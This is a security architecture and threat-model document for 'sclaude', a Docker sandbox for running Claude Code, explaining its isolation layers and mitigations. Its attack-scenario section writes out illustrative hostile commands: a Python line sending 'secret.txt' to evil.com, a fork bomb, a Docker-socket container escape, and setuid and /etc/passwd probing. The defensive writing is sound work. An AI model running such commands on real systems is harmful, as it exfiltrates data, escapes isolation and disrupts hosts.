# Security Architecture - sclaude

Comprehensive security analysis of sclaude's Docker sandbox for running Claude Code with persistent configuration.

## Threat Model

### What We're Protecting Against

1. **Path Traversal Attacks**: Accessing files outside workspace using `..`, symlinks, or other techniques
2. **Container Escape**: Breaking out of Docker container to access host system
3. **Privilege Escalation**: Gaining root or elevated privileges
4. **Resource Exhaustion**: Consuming unlimited CPU, memory, or processes
5. **Credential Theft**: Accessing SSH keys, API tokens outside workspace
6. **Data Exfiltration**: Uploading workspace files to malicious servers

### What We're NOT Protecting Against

1. **Intentional Malicious Use**: User deliberately creating harmful tasks
2. **Physical Access**: Someone with physical access to the host
3. **Zero-day Container Escapes**: Unknown Docker vulnerabilities
4. **Social Engineering**: Tricking user into accepting malicious changes

## Security Layers

### Layer 1: Filesystem Isolation

#### Workspace Mount
```bash
-v "$WORKSPACE_PATH:$WORKSPACE_PATH:rw"
```

**Protection**: Uses absolute path, mounted at same location in container

**Prevents**:
- ✅ `../../../etc/passwd` - Cannot traverse outside mount
- ✅ `~/sensitive-file` - Only workspace accessible
- ✅ Moving files outside workspace - Mount boundary enforced by kernel

**How It Works**:
- Docker bind mounts create isolated filesystem namespace
- Kernel enforces boundaries at mount point
- No amount of `..` traversal can escape

#### Docker Volumes for Persistence
```bash
-v sclaude-config:/sclaude-config:rw \
-v sclaude-rootfs:/home/claude:rw \
-v sclaude-npm:/home/claude/.npm-global:rw \
-v sclaude-pip:/home/claude/.local:rw \
-v sclaude-apt:/var/cache/apt:rw
```

**Protection**:
- Isolated from host filesystem
- Stored in Docker-managed storage
- Cannot access host directories

**Benefits**:
- ✅ Credentials persist across runs
- ✅ Package caches persist
- ✅ No conflicts with host files
- ✅ Clean separation of concerns

### Layer 2: User Privileges

#### Non-Root User
```dockerfile
ARG USER_UID=1000
ARG USER_GID=1000
RUN (groupadd -g ${USER_GID} claude 2>/dev/null || groupadd claude) && \
    useradd -u ${USER_UID} -g $(getent group ${USER_GID} | cut -d: -f1 || echo claude) -m -s /bin/bash claude

USER claude
```

**Protection**:
- All processes run as non-root
- UID/GID matches host user (for file permissions)

**Prevents**:
- ✅ Modifying system configuration
- ✅ Accessing privileged operations
- ✅ Installing system-level malware

#### Sudo Configuration
```dockerfile
RUN echo 'claude ALL=(root) NOPASSWD: /usr/bin/apt-get, /usr/bin/apt, /usr/bin/dpkg' >> /etc/sudoers.d/claude
```

**Limited Sudo**:
- Only for apt/dpkg commands
- No password required (for convenience)
- Packages ephemeral (lost on container restart)

**Rationale**:
- Allows Claude to install packages temporarily
- Container is ephemeral (--rm flag), changes don't persist
- Still cannot modify system outside container

### Layer 3: Capability Dropping

```bash
--cap-drop=ALL \
--cap-add=NET_BIND_SERVICE
```

**Protection**:
- Removes all Linux capabilities
- Only adds back NET_BIND_SERVICE (bind ports <1024)

**Prevents**:
- ✅ `CAP_SYS_ADMIN` - Cannot mount filesystems or create namespaces
- ✅ `CAP_SYS_PTRACE` - Cannot debug other processes
- ✅ `CAP_NET_ADMIN` - Cannot modify network configuration
- ✅ `CAP_SYS_MODULE` - Cannot load kernel modules
- ✅ `CAP_DAC_OVERRIDE` - Cannot bypass file permissions
- ✅ `CAP_MKNOD` - Cannot create device files

**Result**: Even if root is achieved, capabilities severely limit damage.

### Layer 4: Security Options

```bash
--security-opt=no-new-privileges
```

**Protection**:
- Prevents gaining additional privileges via setuid/setgid
- Blocks privilege escalation vectors

**Prevents**:
- ✅ Exploiting setuid binaries (sudo, ping, etc.)
- ✅ Gaining capabilities via file capabilities
- ✅ Escalating from claude user to root

### Layer 5: Resource Limits

```bash
--memory="4g" \
--cpus="2" \
--pids-limit="100" \
--ulimit nofile=1024:1024
```

**Memory Limit (4GB)**:
- Prevents memory exhaustion attacks
- OOM killer terminates processes at limit
- Host system unaffected

**CPU Limit (2 cores)**:
- Prevents CPU exhaustion (bitcoin mining, etc.)
- Throttles to 2 CPUs max
- Host remains responsive

**Process Limit (100)**:
- Prevents fork bombs
- fork() fails at limit
- System remains stable

**File Descriptor Limit (1024)**:
- Prevents FD exhaustion
- Limits open files

### Layer 6: Network Isolation

```bash
--network bridge
```

**Protection**:
- Isolated network namespace
- Cannot access host network directly

**Prevents**:
- ✅ Sniffing host traffic
- ✅ Accessing host-only services (localhost:*)
- ✅ Layer 2 attacks (ARP spoofing)

**Allows**:
- ✅ Internet access (for package downloads)
- ✅ Outbound connections

**Limitation**:
- ⚠️ Can exfiltrate workspace data (inherent tradeoff for package management)

### Layer 7: Docker Socket NOT Mounted

**Critical**:
```bash
# We NEVER mount docker socket:
# -v /var/run/docker.sock:/var/run/docker.sock  ❌ DANGEROUS
```

**Why This Matters**:
- Docker socket = root-equivalent host access
- Could create privileged container and escape
- Major container escape vector

**Our Approach**:
- ✅ Socket NOT mounted
- ✅ Cannot interact with Docker daemon
- ✅ Cannot create/modify containers

### Layer 8: Ephemeral Container

```bash
--rm
```

**Protection**:
- Container deleted on exit
- Filesystem changes discarded (except volumes)
- Clean slate on each run

**Benefits**:
- ✅ Malware doesn't persist in system
- ✅ apt packages reset each run
- ✅ Cannot build up cruft over time

**What Persists** (by design):
- Docker volumes (credentials, caches)
- Workspace files (the point of the tool)

## Attack Scenarios & Mitigations

### Scenario 1: Path Traversal via `..`

**Attack**:
```python
with open('../../../etc/passwd', 'r') as f:
    data = f.read()
```

**Mitigation**:
- ✅ **BLOCKED**: Mount boundary enforced by kernel
- `..` stays within workspace
- Even symlinks cannot break out

### Scenario 2: Container Escape via Docker Socket

**Attack**:
```bash
docker run -v /:/host --privileged alpine chroot /host
```

**Mitigation**:
- ✅ **BLOCKED**: Socket not mounted
- Cannot access Docker daemon
- Cannot create containers

### Scenario 3: Privilege Escalation via Setuid

**Attack**:
```bash
find / -perm -4000 2>/dev/null
sudo su
```

**Mitigation**:
- ✅ **BLOCKED**: no-new-privileges flag
- Setuid bits ignored
- All capabilities dropped

### Scenario 4: Fork Bomb

**Attack**:
```bash
:(){ :|:& };:
```

**Mitigation**:
- ✅ **BLOCKED**: --pids-limit=100
- fork() fails at limit
- System remains responsive

### Scenario 5: Memory Exhaustion

**Attack**:
```python
data = []
while True:
    data.append([0] * 1000000)
```

**Mitigation**:
- ✅ **BLOCKED**: --memory=4g
- OOM killer terminates at limit
- Host unaffected

### Scenario 6: Data Exfiltration

**Attack**:
```python
import requests
requests.post('https://evil.com', files={'data': open('secret.txt')})
```

**Mitigation**:
- ⚠️ **PARTIALLY MITIGATED**:
  - Can exfiltrate workspace files (inherent tradeoff)
  - Cannot access SSH keys or credentials outside workspace
  - Network access needed for package management

**Best Practices**:
- Don't put secrets in workspace
- Review changes via git diff
- Use git to track all modifications

### Scenario 7: Malicious Package

**Attack**:
```bash
pip install evil-package
```

**Mitigation**:
- ✅ **PARTIALLY MITIGATED**:
  - Runs as non-root
  - Container is ephemeral
  - No access to host files
  - Limited by capabilities

**Blast Radius**:
- Can affect workspace
- Cannot persist to system
- Cannot access SSH keys

## Known Limitations

### 1. Network Access

**Issue**: Full internet access

**Impact**:
- Needed for package downloads
- Can exfiltrate workspace data

**Mitigations**:
- Don't put secrets in workspace
- Review git diff before committing
- Monitor for suspicious activity

### 2. Workspace Access

**Issue**: Full read-write to workspace

**Impact**:
- Can delete/modify all files
- Can commit bad code

**Mitigations**:
- Use git (commit before running)
- Review changes (git diff)
- Can revert (git reset --hard)

### 3. Dependency Trust

**Issue**: Can install any packages

**Impact**:
- Supply chain attacks possible

**Mitigations**:
- Isolated in container
- Cannot persist outside workspace
- Review installed packages

## Security Checklist

**Before running**:
- [ ] Git commit - Save current state
- [ ] No secrets in workspace
- [ ] Native claude logged in (for OAuth sync)

**After running**:
- [ ] Review changes - `git diff`
- [ ] Test functionality
- [ ] Audit dependencies
- [ ] Commit or revert

## Hardening Recommendations

### Maximum Security

1. **Disable network**:
```bash
--network none
```

2. **Read-only workspace** (analysis only):
```bash
-v "$WORKSPACE_PATH:$WORKSPACE_PATH:ro"
```

3. **Reduce resource limits**:
```bash
MEMORY_LIMIT="2g"
CPU_LIMIT="1"
PIDS_LIMIT="50"
```

4. **Add AppArmor profile**:
```bash
--security-opt apparmor=docker-default
```

5. **Use gVisor runtime**:
```bash
--runtime=runsc
```

## Comparison

| Feature | sclaude | Native claude |
|---------|---------|---------------|
| Filesystem | Workspace only | Full system |
| Credentials | Docker volume | Keychain/file |
| Path traversal | Blocked | Possible |
| Privilege escalation | Blocked | Depends on OS |
| Resource limits | Enforced | None |
| Network isolation | Bridge | Full access |
| Container escape | Protected | N/A |
| Performance | Native speed | Native speed |

## Conclusion

sclaude provides **strong isolation** while maintaining full functionality:

**Strong Protections**:
- ✅ Path traversal blocked
- ✅ Container escape prevented
- ✅ Privilege escalation blocked
- ✅ Resource exhaustion prevented
- ✅ Credentials persist securely

**Moderate Protections**:
- ⚠️ Network access (needed for packages)
- ⚠️ Workspace fully accessible (by design)

**Best Used For**:
- Development tasks with version control
- Automated testing and refactoring
- Code generation and bug fixing
- Projects without sensitive credentials

**Not Suitable For**:
- Processing untrusted codebases
- Handling sensitive credentials
- Unattended operation without monitoring
